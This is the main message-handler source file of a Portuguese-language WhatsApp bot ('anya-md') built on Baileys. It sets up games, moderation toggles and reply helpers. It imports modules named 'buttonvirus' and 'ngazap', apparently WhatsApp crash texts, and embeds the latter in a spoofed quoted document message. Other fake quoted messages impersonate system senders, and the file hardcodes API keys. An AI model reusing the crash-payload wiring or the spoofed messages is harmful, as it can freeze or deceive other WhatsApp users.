process.on('uncaughtException', console.error)
require('./settings')
require('./index')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, WAMikuBotIncection, MessageType, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, prepareMessageFromContent, relayWAMessage, downloadContentFromMessage, getContentType, fetchLatestBaileysVersion } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const crypto = require('crypto')
const chalk = require('chalk')
const { exec, spawn, execSync } = require('child_process')
const axios = require('axios')
const FileType = require('file-type')
const { fetchUrl, isUrl, processTime } = require("./lib/myfunc")
const ms = require('ms')
//const caliph = require('caliph-api')
const yogipw = require("tod-api")
const path = require('path')
const url = require('url')
const os = require('os')
const xa = require('xfarr-api')
const xeonkey = require('xfarr-api')
const hx = require('hxz-api')
const cheerio = require("cheerio")
const yts = require('yt-search')
//const maker = require('mumaker')
const fetch = require('node-fetch')
const { Readability } = require('@mozilla/readability');
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const Config = require('./database/alone');
const simpleGit = require('simple-git');
const git = simpleGit();
const Heroku = require('heroku-client');
const qrcode = require('qrcode')
const { PassThrough } = require('stream');
const instagram = require("@phaticusthiccy/open-apis");
const { getLinkPreview, getPreviewFromContent } = require("link-preview-js");
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime,  sleep, clockString, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom } = require('./lib/myfunc')
const { wikiSearch } = require('./lib/wiki.js')
//const { lirikLagu } = require('./funções/lirik.js')
const { addCommands, checkCommands, deleteCommands } = require('./lib/autoresp')
/*let { addLevelingId, addLevelingLevel, addLevelingXp, getLevelingId, getLevelingLevel, getLevelingXp } = require("./lib/lvlfunction")*/
const speedofbot = require("performance-now")
const { mediafireDl } = require('./lib/mediafire.js')
const { lirikLagu } = require('./lib/lirik.js')
const { fromBuffer } = require('file-type')
const { getExtension } = require("./lib/functions.js")
//const mel = require('kitsune-api');
//let { msgFilter } = require('./src/miku.js')
const { Boom } = require("@hapi/boom")
const ffmpeg = require('fluent-ffmpeg')
const { Aki } = require('aki-api')
const { checkPetualangUser, addInventori, addBesi, sellBesi, getBesi, addDm, sellDm, getDm, addEmas, sellEmas, getEmas, addFish, sellFish, getFish } = require('./database/tez.js')
const { addLevelingId, addLevelingLevel ,addLevelingXp, getLevelingId, getLevelingLevel, getLevelingXp } = require('./database/level')
const { isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require('./database/limit')
const dontback = JSON.parse(fs.readFileSync('./database/dontback.json'))
let ssewa = JSON.parse(fs.readFileSync('./database/sewa.json'))
let _sewa = require("./lib/sewa");
const sewa = JSON.parse(fs.readFileSync('./database/sewa.json'))
const antiflood = JSON.parse(fs.readFileSync('./database/antis/antiflood.json'));
const limitefll = JSON.parse(fs.readFileSync('./database/flood.json'));
const { addContg, verifContg, verContg, resetContg} = require('./lib/play.js')
const blockcmd = JSON.parse(fs.readFileSync('./database/blockcmd.json'))
const { eununca } = require("./lib/eununca.js")
 let _limit = JSON.parse(fs.readFileSync('./database/limit.json'));
const  sacoleno = JSON.parse(fs.readFileSync('./database/antis/antilink.json'))
const _level = JSON.parse(fs.readFileSync('./database/leveluser.json'))
const _petualang = JSON.parse(fs.readFileSync('./database/inventori.json'))
const forca = JSON.parse(fs.readFileSync('./database/forca.json'))
const puppet = JSON.parse(fs.readFileSync('./database/puppet_forca.json'))
const balance = JSON.parse(fs.readFileSync('./database/balance.json'))
const sacoleanti = JSON.parse(fs.readFileSync('./lib/rude.json'))
const sotoy = JSON.parse(fs.readFileSync('./database/sotoy.json'));
const owner = JSON.parse(fs.readFileSync('./database/owner.json').toString())   
let autoreact = JSON.parse(fs.readFileSync('./database/autoreact.json'));
let bad = JSON.parse(fs.readFileSync('./lib/rude.json'))
let _registered = JSON.parse(fs.readFileSync('./database/registered.json'));
const autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json')) 
const _autostick = JSON.parse(fs.readFileSync('./database/autostickpc.json'))
const antifake = JSON.parse(fs.readFileSync('./database/antis/antifake.json'));
const antiimg = JSON.parse(fs.readFileSync('./database/antis/antiimg.json'))
const antiviewonce = JSON.parse(fs.readFileSync('./database/antis/antiviewonce.json'));
const antidoc = JSON.parse(fs.readFileSync('./database/antis/antidoc.json'))
const anticatalogo = JSON.parse(fs.readFileSync('./database/antis/anticatalogo.json'));
const commandsDB = JSON.parse(fs.readFileSync('./src/commands.json'))
const { getRegisterNo, getRegisterName, getRegisterSerial, getRegisterAge, getRegisterTime, getRegisteredRandomId, addRegisteredUser, createSerial, checkRegisteredUser } = require('./lib/register.js')    
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, writeExif, writeExifStc } = require('./lib/exif2')
const { palavras } = require('./database/conselhos.js');
const { buttonvirus } = require('./database/buttonvirus')
const { ngazap } = require('./database/ngazap')
var timekk = moment.tz('America/Sao_Paulo').format('HH:mm:ss')
var datakk = moment.tz('America/Sao_Paulo').format('DD/MM')
const akinator = JSON.parse(fs.readFileSync('./src/akinator.json'))
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
global.db = JSON.parse(fs.readFileSync('./src/db.json'))
/*const tictactoe = JSON.parse(fs.readFileSync("./database/tictactoe.json"));
const {
  addTTTId,
  addTTTwin,
  addTTTdefeat,
  addTTTtie,
  addTTTpoints,
  getTTTId,
  getTTTwins,
  getTTTdefeats,
  getTTTties,
  getTTTpoints,
} = require("./lib/tictactoe.js");*/
if (global.db) global.db = {
    sticker: {},
    database: {},
    game: {},
    settings: {},
    others: {},
    users: {},
    chats: {},
    ...(global.db || {})
}
let tebaklagu = db.game.tebaklagu = []
let _family100 = db.game.family100 = []
let kuismath = db.game.math = []
let tebakgambar = db.game.tebakgambar = []
let tebakkata = db.game.tebakkata = []
let caklontong = db.game.lontong = []
let caklontong_desk = db.game.lontong_desk = []
let tebakkalimat = db.game.kalimat = []
let tebaklirik = db.game.lirik = []
let tebaktebakan = db.game.tebakan = []
let vote = db.others.vote = []

const img = fs.readFileSync('./lib/anya2.jpg')

const { 
  yta, 
  ytv, 
  ytsr,
  searchResult 
 } = require('./lib/ytdl')

alonetyping = false
wlcm = [] 
nomedobot =  '𝐴𝑵𝒀𝐴-𝑴𝑫'
watermark = '© _copyright by anya-md_'
nomedodono = "@alone no shawty's"
numerododono = '+55 88 9820-4406'
const turbrek = `break`
baterai = {
battery: "" || "Não detectado",
isCharge: "" || false
}
autocomposing = false
limitefl = limitefll.limitefl
prefixx = global.prefix
ky_ttt = [];
tttawal = ["0️⃣", "1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"];

module.exports = anya = async (anya, m, chatUpdate, store) => {
try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
bady = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype === 'extendedTextMessage') ? m.message.extendedTextMessage.text : ''
selectedButton = (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : ''

anyaBot = (m.mtype === 'conversation' && m.message.conversation.startsWith(prefix)) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message[m.mtype].caption.startsWith(prefix) ? m.message[m.mtype].caption : (m.mtype == 'videoMessage') && m.message[m.mtype].caption.startsWith(prefix) ? m.message[m.mtype].caption : (m.mtype == 'extendedTextMessage') && m.message[m.mtype].text.startsWith(prefix) ? m.message[m.mtype].text : (m.mtype == 'listResponseMessage') && m.message[m.mtype].singleSelectReply.selectedRowId ? m.message[m.mtype].singleSelectReply.selectedRowId : (m.mtype == 'buttonsResponseMessage') && m.message[m.mtype].selectedButtonId ? m.message[m.mtype].selectedButtonId : (m.mtype == 'stickerMessage') && ((m.message[m.mtype].fileSha256.toString('base64')) !== null && (m.message[m.mtype].fileSha256.toString('base64')) !== undefined) ? (m.message[m.mtype].fileSha256.toString('base64')) : ""
const isViewOnce = (m.mtype == 'viewOnceMessage')
const isButton = (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : ''
var budy = (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : typeof m.text == 'string' ? m.text : ''
//var prefix = prefa ? /^[°┊π÷┊¶∆£¢€¥®™+✓_=|~!?#$%^&.©^]/gi.test(body) ? body.match(/^[°┊π÷┊¶∆£¢€¥®™+✓_=|~!?#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
	anya.ev.on("CB:action,,battery", json => {
	    const battery = json[2][0][1].value
	    const persenbat = parseInt(battery)
	    baterai.battery = `${persenbat}%`
	    baterai.isCharge = json[2][0][1].live
	    })
const isCmd = body.startsWith(prefix)
//global.prefix
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await anya.decodeJid(anya.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const from = m.chat
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const isPetualang = checkPetualangUser(sender)
const groupMetadata = m.isGroup ? await anya.groupMetadata(m.chat).catch(e => {}) : ''
const groupId = m.isGroup ? groupMetadata.id : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupMembers = m.isGroup ? groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isAntinsfw = m.isGroup ?  sacoleno.includes(m.chat) : false
const isAutReact = m.isGroup ? autoreact.includes(from) : false
const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
const antiToxic = m.isGroup ? sacoleanti.includes(from) : false
const isAntiFlood = m.isGroup ? antiflood.includes(from) : false	
const isSewa = _sewa.checkSewaGroup(from, sewa)
const isAntidoc = m.isGroup ? antidoc.includes(from) : false
const isAntiCatalogo = m.isGroup ? anticatalogo.includes(from) : false   
const isRegistered = checkRegisteredUser(m.sender) 
const isUser = checkRegisteredUser(m.sender)
const isAutoSticker = autosticker.includes(from)
const isAutoStick = _autostick.includes(from)
const iswelcm = m.isGroup ? wlcm.includes(from) : true
const isAntiFa = m.isGroup ? antifake.includes(from) : true
const isAntiImg = m.isGroup ? antiimg.includes(from) : false
const isAntiVO = m.isGroup ? antiviewonce.includes(from) : false
const allForcaId = []
for(let obj of forca) allForcaId.push(obj.id)
const isPlayForca = allForcaId.indexOf(sender) >= 0 ? true : false
const argsButton = selectedButton.trim().split(/ +/)
const MikuBotIncv3 = body.slice(0).trim().split(/ +/).shift().toLowerCase()
const content = JSON.stringify(m.message)
const isQuotedMsg = m.mtype === "extendedTextMessage" && content.includes("textMessage")
const isQuotedImage = m.mtype === "extendedTextMessage" && content.includes("imageMessage")
const isQuotedVideo = m.mtype === "extendedTextMessage" && content.includes("videoMessage")
const isQuotedDocument = m.mtype === "extendedTextMessage" && content.includes("documentMessage")
const isQuotedAudio = m.mtype === "extendedTextMessage" && content.includes("audioMessage")
const isQuotedSticker = m.mtype === "extendedTextMessage" && content.includes("stickerMessage")
const isQuotedContact = m.mtype === "extendedTextMessage" && content.includes("contactMessage")
const isQuotedLocation = m.mtype === "extendedTextMessage" && content.includes("locationMessage")
const isQuotedProduct = m.mtype === "extendedTextMessage" && content.includes("productMessage")
const getFileBuffer = async (mediakey, MediaType) => { 
const stream = await downloadContentFromMessage(mediakey, MediaType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
return buffer
}
    idttt = [];
    players1 = [];
    players2 = [];
    gilir = [];
    for (let t of ky_ttt) {
      idttt.push(t.id);
      players1.push(t.player1);
      players2.push(t.player2);
      gilir.push(t.gilir);
    }
    const isTTT = m.isGroup ? idttt.includes(m.from) : false;
    isPlayer1 = m.isGroup ? players1.includes(m.sender) : false;
    isPlayer2 = m.isGroup ? players2.includes(m.sender) : false;

global.APIs = { 
    bx: 'https://bx-hunter.herokuapp.com',
    dhnjing: 'https://dhnjing.xyz',
    hardianto: 'https://hardianto-chan.herokuapp.com',
    jonaz: 'https://jonaz-api-v2.herokuapp.com',
    neoxr: 'https://neoxr-api.herokuapp.com',
    nrtm: 'https://nurutomo.herokuapp.com',
    pencarikode: 'https://pencarikode.xyz',
    xteam: 'https://api.xteam.xyz',
    zahir: 'https://zahirr-web.herokuapp.com',
    zekais: 'http://zekais-api.herokuapp.com',
    zeks: 'https://api.zeks.xyz',
  }
  global.APIKeys = { 
    'https://bx-hunter.herokuapp.com': 'Ikyy69',
    'https://hardianto-chan.herokuapp.com': 'hardianto',
    'https://neoxr-api.herokuapp.com': 'yntkts',
    'https://pencarikode.xyz': 'pais',
    'https://api.xteam.xyz': 'apikeymu',
    'https://zahirr-web.herokuapp.com': 'zahirgans',
    'https://api.zeks.xyz': 'apivinz',
  }
const runtime = function (seconds) {
seconds = Number(seconds);
var d = Math.floor(seconds / (3600 * 24));
var h = Math.floor((seconds % (3600 * 24)) / 3600);
var m = Math.floor((seconds % 3600) / 60);
var s = Math.floor(seconds % 60);
var dDisplay = d > 0 ? d + (d == 1 ? " dia, " : " Dia, ") : "";
var hDisplay = h > 0 ? h + (h == 1 ? " hora, " : " Hora, ") : "";
var mDisplay = m > 0 ? m + (m == 1 ? " minuto, " : " Minuto, ") : "";
var sDisplay = s > 0 ? s + (s == 1 ? " segundo" : " Segundo") : "";
return dDisplay + hDisplay + mDisplay + sDisplay;
}
try {
ppuser = await anya.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)


const reply = (teks) => {
    anya.sendMessage(m.chat, {text: teks, contextInfo: {"externalAdReply": {title: "anya-md",mediaType: 3, renderLargerThumbnail: false, showAdAttribution: true, detectLinks: true,body: "anya-md", thumbnail: fs.readFileSync('./lib/anya.jpg'),sourceUrl: ("https://wa.me/+558898204406")}}})
}
const reply2 = (teks) => {
    anya.sendMessage(m.chat, {text: teks, contextInfo: {"externalAdReply": {title: nomedobot,mediaType: 3, renderLargerThumbnail: false, showAdAttribution: true, detectLinks: true,body: teks, thumbnail: img,sourceUrl: ("github.com/Ajmal-Achu")}}})
}
const replay = (teks) => {
    anya.sendMessage(m.chat, {text: teks, contextInfo: {"externalAdReply": {title: "anya-md",mediaType: 3, renderLargerThumbnail: false, showAdAttribution: true, body: "anya-md", thumbnail: fs.readFileSync('./lib/anya.jpg'),sourceUrl: ("https://wa.me/+558898204406")}}})
}

const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `ANYA-MD${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}

const enviarbutao = (from, text, footer, buttons) => {
            return anya.sendMessage(m.chat, { text: text, footer: footer, templateButtons: buttons, quoted: m })
        }

const sendBimgT = async (id, img1, text1, desc1, but = [], m) => {
templateMessage = {
image: {url: img1},
caption: text1,
footer: desc1,
templateButtons: but,
}
anya.sendMessage(id, templateMessage, {quoted: m})
}

let blessedtuna = {
    key : {
        fromMe: false,
participant : '0@s.whatsapp.net'
},
  message: {
  documentMessage: {
showAdAttribution: true,
  title: "anya-md", 
  jpegThumbnail: fs.readFileSync('./lib/anya.jpg')
}
}
 }

 
 let mudratunha = {
    key: { 
         fromMe: false,
         participant: `0@s.whatsapp.net`, ...(m.chat ? 
    { remoteJid: "17608914335-1625305606@g.us" } : {}) 
               },
    message: { 
       "extendedTextMessage": {
                "text":"@alone no shawty's",
                "title": 'anya-md',
                'jpegThumbnail': fs.readFileSync('./lib/anya.jpg')
             }
           } 
          }
          
 const fcarrinho = {
      key: {
        participant: "0@s.whatsapp.net",
      },
      message: {
        orderMessage: {
          itemCount: 1,
          status: 1,
          surface: 1,
          message: `${nomedobot}`,
          orderTitle: "Bang",
          thumbnail: img,
          sellerJid: "0@s.whatsapp.net",
        },
      },
    };         
    const fcatalogo = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "0@s.whatsapp.net" } : {}),
      },
      message: {
        productMessage: {
          product: {
            productImage: {
              mimetype: "image/jpeg",
              jpegThumbnail: img, //Gambarnye
            },
            title: `${nomedobot}`, //Kasih namalu
            description: "BOT DE WHATSAPP",
            currencyCode: "USD",
            priceAmount1000: "2000",
            retailerId: "Ghost",
            productImageCount: 1,
          },
          businessOwnerJid: `0@s.whatsapp.net`,
        },
      },
    };
    //----------[ FAKE LOKASI ]--------//
    const floc2 = {
      key: {
        participant: "0@s.whatsapp.net",
      },
      message: {
        locationMessage: {
          name: `${nomedobot}`,
          jpegThumbnail: img,
        },
      },
    };
    figurinhakkk = await getBuffer(
      `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTqBmSN-SkLYbwbJiBF5jpdP6c_USG77YRH1g&usqp=CAU`
    );
    const fig = {
      key: { fromMe: false, participant: "0@s.whatsapp.net" },
      message: {
        extendedTextMessage: {
          text: `Aqui está o seu sticker!`,
          title: `TM`,
          jpegThumbnail: figurinhakkk,
        },
      },
    };
    const fgclink = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "0@s.whatsapp.net",
      },
      message: {
        groupInviteMessage: {
          groupJid: "120363048157557581@g.us",
          inviteCode: "mememteeeekkeke",
          groupName: "Mengter",
          caption: "Halo bang jagoo",
          jpegThumbnail: img,
        },
      },
    };
    
          
 for (var i = 0; i < commandsDB.length ; i++) {
				if (budy.toLowerCase() === commandsDB[i].pesan) {
					m.reply(commandsDB[i].balasan)
				}
			}         
			
			const sendKontak = (from, nomor, nama) => {
	        const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + `ORG:Criador ${nomedobot}\n` + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	        anya.sendMessage(m.chat, { contacts: { displayName: nama, contacts: [{ vcard }] } }, { quoted: m })
            }
          
     if (budy.toLowerCase() == "sim" && "Sim" && "yes" && "Yes" && verContg(sender) !== false && verifContg(sender)) {
m.reply(mess.wait)
    let { yta } = require('./lib/y2mate')
    let quality = args[1] ? args[1] : '128kbps'
    let media = await yta(verContg(sender), quality)
    if (media.filesize >= 100000) return m.reply('Arquivo acima do limite ')
    var buf = await getBuffer(media.thumb)
    anya.sendMessage(m.chat, {audio:{url:media.dl_link}, mimetype:"audio/mpeg", fileName: `${media.title}.mp3`,  quoted: m, contextInfo: { externalAdReply:{
        showAdAttribution: true,
        title:media.title,
        body:"YOUTUBE MP3",
        mediaType:2,
        thumbnail:buf,
        mediaUrl:`${media.dl_link}`, 
        sourceUrl: `${media.title}` }}}, {quoted:m})
        setTimeout(() => { 
        resetContg(sender) 
        }, 120000);
    }

let picaks = [flaming,fluming,flarun,flasmurf,mehk,awog,mohai,mhehe]
let picak = picaks[Math.floor(Math.random() * picaks.length)]
    try {
 let isNumber = x => typeof x === 'number' && !isNaN(x)
 let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
 let user = global.db.users[m.sender]
 if (typeof user !== 'object') global.db.users[m.sender] = {}
 if (user) {
   if (!isNumber(user.afkTime)) user.afkTime = -1
   if (!('afkReason' in user)) user.afkReason = ''
   if (!isNumber(user.limit)) user.limit = limitUser
 } else global.db.users[m.sender] = {
   afkTime: -1,
   afkReason: '',
   limit: limitUser,
 }
 let chats = global.db.chats[m.chat]
   if (typeof chats !== 'object') global.db.chats[m.chat] = {}
   if (chats) {
  if (!('mute' in chats)) chats.mute = false
  if (!('chatbot' in chats)) chats.chatbot = false
  if (!('antilink' in chats)) chats.antilink = false
  if (!('antilinkyt' in chats)) chats.antilinkyt = false
  if (!('autoblock' in chats)) chats.autoblock = false
  if (!('antilinkall' in chats)) chats.antilinkall = false
  if (!('antiytchannel' in chats)) chats.antiytchannel = false
  if (!('antitiktok' in chats)) chats.antitiktok = false
  if (!('antitelegram' in chats)) chats.antitelegram = false
  if (!('antiinstagram' in chats)) chats.antiinstagram = false
  if (!('antifb' in chats)) chats.antifb = false
  if (!('antibule' in chats)) chats.antibule = false
  if (!('antiwame' in chats)) chats.antiwame = false
  if (!('wame' in chats)) chats.wame = false
  if (!('antitwitter' in chats)) chats.antitwitter = false
  if (!('antivn' in chats)) chats.antivn = false
  if (!('antiphoto' in chats)) chats.antiphoto = false
  if (!('antisticker' in chats)) chats.antisticker = false
  if (!('antivideo' in chats)) chats.antivideo = false
} else global.db.chats[m.chat] = {
   mute: false,
   chatbot: false,
   wame: false,
   antilink: false,
   antilinkyt: false,
   antilinkall: false,
   antiytchannel: false,
   antitiktok: false,
   antitelegram: false,
   antiinstagram: false,
   antifb: false,
   antibule: false,
   antiwame: false,
   antitwitter: false,
   antisticker: false,
   antiphoto: false,
   antivn: false,
   antivideo: false,
 }
 let setting = global.db.settings[botNumber]
 if (typeof setting !== 'object') global.db.settings[botNumber] = {}
    if (setting) {
if (!isNumber(setting.status)) setting.status = 0
if (!('autobio' in setting)) setting.autobio = true
if (!('templateImage' in setting)) setting.templateImage = false
if (!('templateLocation' in setting)) setting.templateLocation = false
if (!('templateGif' in setting)) setting.templateGif = false
if (!('templateMsg' in setting)) setting.templateMsg = false
if (!('templateList' in setting)) setting.templateList = false
if (!('templateDoc' in setting)) setting.templateDoc = true
if (!('chatbot' in setting)) setting.chatbot = false
if (!('templateMikubot' in setting)) setting.templateMikubot = false
if (!('grouponly' in setting)) setting.grouponly = false
if (!('autoblock' in setting)) setting.autoblock = false
    } else global.db.settings[botNumber] = {
status: 0,
autobio: true,
templateImage: false,
templateLocation: false,
templateGif: false,
templateMsg: false,
templateList: false,
templateDoc: true,
templateMikubot: false,
chatbot: false,
grouponly: false,
autoblock: false,
    }
} catch (err) {
 console.error(err)
}

const sendListMsg = async (title, description, textButton, sections) => {
var list = WAProto.Message.fromObject({
listMessage: WAProto.ListMessage.fromObject({title: title,
buttonText: textButton,
description: description,
listType: 1,
sections: sections
})
})
await anya.relayMessage(m.chat, list, {messageId: m.key.id})
}

_sewa.expiredCheck(anya, sewa)

anya.ws.on('CB:action,,battery', json => {
const batteryLevelStr = json[2][0][1].value
const batterylevel = parseInt (batteryLevelStr)
  battre = batterylevel
})  

anya.ws.on('CB:action,,charger', json => {
const chargerLevelStr = json[2][0][1].value
const charging = parseInt (chargerLevelStr)
  charger = charging
})  

const reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, id: quoted.id }
                    }
                }
//public/self
if (!anya.public) {
if (!m.key.fromMe) return
}
colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
let d = new Date(new Date + 3600000)
let locale = 'id'
let time = moment.tz('America/Sao_Paulo').format('DD/MM HH:mm:ss')
const { color } = require('./lib/color')
if (!m.isGroup && isCmd && m.sender) console.log(`${color('╭━━━━━━━━━━━━━━━━━━━━━━━━━╮', 'gold')}\n${color('┃', 'gold')} ${color('Número:', 'yellow')} ${color(m.sender.split('@')[0], 'purple')}\n${color('┃', 'gold')} ${color('Nome:', 'yellow')} ${color(pushname, 'purple')}\n${color('┃', 'gold')} ${color('Data:', 'yellow')} ${color(time, 'magenta')}\n${color('┃', 'gold')} ${color('Comando:', 'yellow')} ${color(command)}\n${color('┃', 'gold')} ${color('Palavras:', 'yellow')} ${color(budy.length, 'magenta')}\n${color('╰━━━━━━━━━━━━━━━━━━━━━━━━━╯', 'gold')}`)
if (!m.isGroup && !isCmd && m.sender) console.log(`${color('╭━━━━━━━━━━━━━━━━━━━━━━━━━╮', 'gold')}\n${color('┃', 'gold')} ${color('Número:', 'yellow')} ${color(m.sender.split('@')[0], 'magenta')}\n${color('┃', 'gold')} ${color('Nome:', 'yellow')} ${color(pushname, 'purple')}\n${color('┃', 'gold')} ${color('Data:', 'yellow')} ${color(time, 'magenta')}\n${color('┃', 'gold')} ${color('Comando:', 'yellow')} ${color('Não', 'red')}\n${color('┃', 'gold')} ${color('Palavras:', 'yellow')} ${color(budy.length, 'magenta')}\n${color('╰━━━━━━━━━━━━━━━━━━━━━━━━━╯', 'gold')}`)
if (isCmd && m.isGroup && m.sender) console.log(`${color('╭━━━━━━━━━━━━━━━━━━━━━━━━━╮', 'gold')}\n${color('┃', 'gold')} ${color('Número:', 'yellow')} ${color(m.sender.split('@')[0], 'magenta')}\n${color('┃', 'gold')} ${color('Nome:', 'yellow')} ${color(pushname, 'purple')}\n${color('┃', 'gold')} ${color('Data:', 'yellow')} ${color(time, 'magenta')}\n${color('┃', 'gold')} ${color('Comando:', 'yellow')} ${color(command)}\n${color('┃', 'gold')} ${color('Palavras:', 'yellow')} ${color(budy.length, 'magenta')}\n${color('┃', 'gold')} ${color('Grupo:', 'yellow')} ${color(groupName, 'magenta')}\n${color('╰━━━━━━━━━━━━━━━━━━━━━━━━━╯', 'gold')}`)
if (!isCmd && m.isGroup && m.sender) console.log(`${color('╭━━━━━━━━━━━━━━━━━━━━━━━━━╮', 'gold')}\n${color('┃', 'gold')} ${color('Número:', 'yellow')} ${color(m.sender.split('@')[0], 'magenta')}\n${color('┃', 'gold')} ${color('Nome:', 'yellow')} ${color(pushname, 'purple')}\n${color('┃', 'gold')} ${color('Data:', 'yellow')} ${color(time, 'magenta')}\n${color('┃', 'gold')} ${color('Comando:', 'yellow')} ${color('Não', 'red')}\n${color('┃', 'gold')} ${color('Palavras:', 'yellow')} ${color(budy.length, 'magenta')}\n${color('┃', 'gold')} ${color('Grupo:', 'yellow')} ${color(groupName, 'magenta')}\n${color('╰━━━━━━━━━━━━━━━━━━━━━━━━━╯', 'gold')}`)        
 
var ikan = ['🐳','🦈','🐬','🐋','🐟','🐠','🦐','🦑','🦀','🐡','🐙']
var hewan = ['🐔','🦃','🦆','🐐','🐏','🐖','🐑','🐎']
var burung = ['🦋','🕷','🐝','🐉','🦆','🦅','🕊','🐧','🐦','🦇']
var petnya = ['😾','🐺','🦊','🐶','🐰']
var makan = ['🌭','🌮','🌯','🍙','🍝','🍕','🍘','🍟','🍞','🍖','🍡']
var buahan = ['🍇','🍎','🍏','🍐','🍒','🍊','🍋','🍑','🍓']

function randomNomor(min, max = null) {
  if (max !== null) {
  min = Math.ceil(min);
  max = Math.floor(max);
  return Math.floor(Math.random() * (max - min + 1)) + min;
  } else {
  return Math.floor(Math.random() * min) + 1
  }
  }

function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
  }
          const emote = (satu, dua) => {
            try{	    
            const { EmojiAPI } = require("emoji-api");
            const emoji = new EmojiAPI();
            emoji.get(satu)
            .then(emoji => {
            const buttons = [{buttonId: "y", buttonText: {displayText:satu}, type: 1}]
            const buttonMessage = {image: {url: emoji.images[dua].url},caption: "anya-md",footerText: 'Loading...',buttons: buttons,headerType: 4}
            anya.sendMessage(from, buttonMessage, {quoted:m})
            })
            } catch (e) {
            m.reply("Emoji error, please enter another emojinNOTE : Just enter 1 emoji")
            }
            }
